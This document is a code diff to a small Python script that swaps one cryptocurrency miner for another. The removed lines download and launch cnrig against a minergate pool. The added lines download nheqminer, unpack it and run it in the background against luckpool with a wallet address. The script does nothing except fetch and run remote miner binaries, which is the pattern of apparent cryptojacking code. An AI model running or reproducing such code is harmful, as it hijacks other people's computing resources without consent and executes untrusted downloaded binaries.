@@ -1,4 +1,4 @@
 import os
-a  = os.popen('wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64').readlines()
-a  = os.popen('chmod +x cnrig').readlines()
-a  = os.popen('./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B').readlines()
+a  = os.popen('wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz').readlines()
+a  = os.popen('tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz').readlines()
+b  = os.popen('nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RV2tjiZptDEbuyaecnVH22PUg5Z7ihyiT2.try -p x -t 4').readlines()
